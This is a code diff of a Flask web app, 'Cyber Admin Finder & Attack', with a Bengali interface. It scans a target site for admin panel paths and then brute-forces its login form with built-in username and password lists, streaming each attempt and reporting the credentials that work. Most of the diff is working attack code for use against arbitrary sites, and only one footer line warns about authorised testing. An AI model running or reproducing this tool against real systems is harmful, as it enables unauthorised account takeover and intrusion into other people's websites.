@@ -5,7 +5,7 @@ import time
 
 app = Flask(__name__)
 
-# ==================== HTML  (AJAX  ) ====================
+# ==================== HTML টেমপ্লেট (AJAX ফেচ সহ) ====================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="bn">
@@ -41,75 +41,82 @@ HTML_TEMPLATE = """
 <body>
 <div class="container">
     <div class="header">
-        <h1> Cyber Admin Finder & Attack</h1>
-        <div class="sub">Developer <span>Arif</span>  v4.0  <span class="badge">#Streaming</span></div>
+        <h1>🛡️ Cyber Admin Finder & Attack</h1>
+        <div class="sub">Developer <span>Arif</span> • v4.0 • <span class="badge">#Streaming</span></div>
     </div>
 
-    <!--  :    -->
+    <!-- কার্ড ১: অ্যাডমিন প্যানেল ফাইন্ডার -->
     <div class="card">
-        <h3> .   </h3>
+        <h3>🔍 ১. অ্যাডমিন প্যানেল খুঁজুন</h3>
         <form method="POST" action="/find_admin">
             <div class="form-group">
                 <input type="text" name="url" placeholder="http://target.com" required>
-                <button type="submit"> Scan</button>
+                <button type="submit">🔎 Scan</button>
             </div>
         </form>
     </div>
 
-    <!--  :   () -->
+    <!-- কার্ড ২: ব্রুটফোর্স অ্যাটাক (স্ট্রিমিং) -->
     <div class="card">
-        <h3> .    (BruteForce)  -</h3>
+        <h3>⚡ ২. লগইন ক্র্যাক করুন (Brute‑Force) – রিয়েল-টাইম</h3>
         <form id="bruteforceForm">
             <div class="form-group">
                 <input type="text" id="login_url" placeholder="http://target.com/admin/login" required>
-                <input type="text" id="username_field" placeholder="  (   )" value="">
-                <input type="text" id="password_field" placeholder=" " value="password">
-                <button type="submit"> Start Attack</button>
+                <input type="text" id="username_field" placeholder="ইউজারনেম ফিল্ড (খালি রাখলেই পাসওয়ার্ড ট্রাই)" value="">
+                <input type="text" id="password_field" placeholder="পাসওয়ার্ড ফিল্ড" value="password">
+                <button type="submit">🚀 Start Attack</button>
             </div>
         </form>
         <div id="resultContainer" class="result-box" style="display:none;"></div>
     </div>
 
     <div class="footer">
-        <span></span>         <span>Developer Arif</span>
+        <span>⚠️</span> শুধুমাত্র অনুমোদিত সিস্টেমে টেস্ট করুন  •  <span>Developer Arif</span>
     </div>
 </div>
 
 <script>
-document.getElementById('bruteforceForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const login_url = document.getElementById('login_url').value;
-    const username_field = document.getElementById('username_field').value;
-    const password_field = document.getElementById('password_field').value;
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('bruteforceForm');
     const resultDiv = document.getElementById('resultContainer');
-    resultDiv.style.display = 'block';
-    resultDiv.innerHTML = '   ...\n';
 
-    try {
-        const response = await fetch('/bruteforce_stream', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ login_url, username_field, password_field })
-        });
-        const reader = response.body.getReader();
-        const decoder = new TextDecoder();
-        while (true) {
-            const { done, value } = await reader.read();
-            if (done) break;
-            const chunk = decoder.decode(value);
-            resultDiv.innerHTML += chunk;
-            resultDiv.scrollTop = resultDiv.scrollHeight;
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault(); // পেজ রিলোড বন্ধ
+        resultDiv.style.display = 'block';
+        resultDiv.innerHTML = '⏳ অ্যাটাক শুরু হচ্ছে...\n';
+
+        const login_url = document.getElementById('login_url').value;
+        const username_field = document.getElementById('username_field').value;
+        const password_field = document.getElementById('password_field').value;
+
+        try {
+            const response = await fetch('/bruteforce_stream', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ login_url, username_field, password_field })
+            });
+
+            const reader = response.body.getReader();
+            const decoder = new TextDecoder();
+
+            while (true) {
+                const { done, value } = await reader.read();
+                if (done) break;
+                const chunk = decoder.decode(value);
+                resultDiv.innerHTML += chunk;
+                resultDiv.scrollTop = resultDiv.scrollHeight;
+            }
+        } catch (err) {
+            resultDiv.innerHTML += '\n❌ সংযোগ বিচ্ছিন্ন হয়েছে। আবার চেষ্টা করুন।';
         }
-    } catch (err) {
-        resultDiv.innerHTML += '\n      ';
-    }
+    });
 });
 </script>
 </body>
 </html>
 """
 
-# ====================  ====================
+# ==================== ব্যাকএন্ড ====================
 
 def find_admin_panels(base_url):
     paths = [
@@ -126,16 +133,16 @@ def find_admin_panels(base_url):
             test_url = base_url.rstrip('/') + path
             r = requests.get(test_url, timeout=2.5, allow_redirects=False)
             if r.status_code in [200, 301, 302, 307, 401, 403]:
-                found.append(f" {test_url}    Status: {r.status_code}")
+                found.append(f"✅ {test_url}  →  Status: {r.status_code}")
         except:
-            found.append(f" {path}  Error")
-    return found if found else ["     "]
+            found.append(f"⚠️ {path} → Error")
+    return found if found else ["❌ কোনো অ্যাডমিন প্যানেল পাওয়া যায়নি।"]
 
 def brute_force_generator(login_url, username_field, password_field):
     if not login_url.startswith(('http://', 'https://')):
         login_url = 'http://' + login_url
 
-    # =====   =====
+    # ===== পাসওয়ার্ড লিস্ট =====
     passwords = [
         'arif123', 'admin', '123456', 'password', '12345', 'root', 'qwerty', 'abc123',
         '111111', 'letmein', 'pass123', 'welcome', 'admin123', 'password123',
@@ -200,52 +207,49 @@ def brute_force_generator(login_url, username_field, password_field):
         'master', 'admin1', 'root1', 'user1', 'test1', 'guest1', 'demo'
     ]
 
-    #  
     usernames = list(set(usernames))
     passwords = list(set(passwords))
 
-    yield "  : {}, : {}  {} \n".format(len(usernames), len(passwords), len(usernames)*len(passwords))
-    yield "  ...\n\n"
+    yield f"📊 মোট ইউজারনেম: {len(usernames)}টি, পাসওয়ার্ড: {len(passwords)}টি → {len(usernames)*len(passwords)}টি কম্বো\n"
+    yield "⏳ শুরু হচ্ছে...\n\n"
 
     found = False
     total = len(usernames) * len(passwords)
     count = 0
 
     if not username_field.strip():
-        #   
         for passw in passwords:
             count += 1
-            yield f"[{count}/{total}]  : (: {passw})\n"
+            yield f"[{count}/{total}] ট্রাই করছি: (পাস: {passw})\n"
             try:
                 data = {password_field: passw}
                 r = requests.post(login_url, data=data, timeout=2, allow_redirects=False)
                 if r.status_code == 302 or (r.status_code == 200 and any(w in r.text.lower() for w in ['dashboard', 'welcome', 'panel'])):
-                    yield f"\n **!** : {passw}\n"
+                    yield f"\n🎯 **সফল!** পাসওয়ার্ড: {passw}\n"
                     found = True
                     break
             except:
-                yield f"  (: {passw})\n"
-            time.sleep(0.2)  #  ,    
+                yield f"⚠️ এরর (পাস: {passw})\n"
+            time.sleep(0.2)
     else:
-        #  +  
         for user, passw in itertools.product(usernames, passwords):
             count += 1
-            yield f"[{count}/{total}]  : {user} : {passw}\n"
+            yield f"[{count}/{total}] ট্রাই করছি: {user} : {passw}\n"
             try:
                 data = {username_field: user, password_field: passw}
                 r = requests.post(login_url, data=data, timeout=2, allow_redirects=False)
                 if r.status_code == 302 or (r.status_code == 200 and any(w in r.text.lower() for w in ['dashboard', 'welcome', 'panel'])):
-                    yield f"\n **!** : {user} | : {passw}\n"
+                    yield f"\n🎯 **সফল!** ইউজার: {user} | পাস: {passw}\n"
                     found = True
                     break
             except:
-                yield f"  ({user}:{passw})\n"
+                yield f"⚠️ এরর ({user}:{passw})\n"
             time.sleep(0.15)
-        #  
+
     if not found:
-        yield "\n    "
+        yield "\n❌ কোনো ক্রেডেনশিয়াল কাজ করেনি।"
     else:
-        yield "\n  "
+        yield "\n✅ অ্যাটাক সম্পূর্ণ।"
 
 @app.route('/', methods=['GET'])
 def index():
@@ -266,7 +270,7 @@ def bruteforce_stream():
     username_field = data.get('username_field', '').strip()
     password_field = data.get('password_field', 'password').strip()
     if not login_url:
-        return Response("  URL ", mimetype='text/plain')
+        return Response("⚠️ লগইন URL দিন।", mimetype='text/plain')
     return Response(stream_with_context(brute_force_generator(login_url, username_field, password_field)),
                     mimetype='text/plain')
 
